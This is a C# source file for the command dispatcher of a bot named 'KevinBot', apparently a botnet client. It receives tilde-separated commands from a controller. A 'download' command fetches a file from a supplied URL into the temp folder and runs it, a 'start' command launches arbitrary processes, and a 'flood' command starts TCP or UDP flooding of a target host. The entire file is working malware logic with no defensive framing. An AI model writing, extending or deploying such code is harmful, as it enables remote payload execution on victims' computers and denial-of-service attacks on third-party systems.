using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.ComponentModel;
using KevinBot.Network;

namespace KevinBot.App
{
    class BotCommander
    {
        Commander Cmdr = new Commander();
        TCPFlooder tcpF = new TCPFlooder();
        UDPFlooder udpF = new UDPFlooder();
        public void Execute(string cmd)
        {
            string[] Item = null;
            char Splitter = '~';
            if (cmd.Contains(Splitter))
            {
                Item = cmd.Split(Splitter);

                string ItemCommand = Item[0];

                switch (ItemCommand)
                {
                    case "download":
                        Cmdr.Update(null);
                        DownloadAndExecute(Item[1], Item[2]);
                        break;
                    case "start":
                        Process.Start(Item[1]); // Open Website
                        Cmdr.Update(null);
                        break;
                    case "flood": // Udp & Tcp
                        string method = Item[1];
                        if (method == "UDP")
                            udpF.Setup(Item[2], Convert.ToInt32(Item[3]), Convert.ToInt32(Item[4]), Convert.ToInt32(Item[5]));
                        else
                            tcpF.Setup(Item[2], Convert.ToInt32(Item[3]), Convert.ToInt32(Item[4]), Convert.ToInt32(Item[5]));
                        Cmdr.Update(null);
                        break;
                }
            }

        }
        #region DownloadAndExecute
        string TempFolder = Path.GetTempPath();
        string SharedName;
        private void DownloadAndExecute(string Url, string Name)
        {
            SharedName = Name;
            WebClient Client = new WebClient();
            Client.DownloadFileCompleted += new AsyncCompletedEventHandler(Downloaded);
            Client.DownloadFileAsync(new Uri(Url), TempFolder + "\\" + Name);
        }
        private void Downloaded(object sender, AsyncCompletedEventArgs  e)
        {
            Process.Start(TempFolder + "/" + SharedName);
        }
        #endregion
    }
}
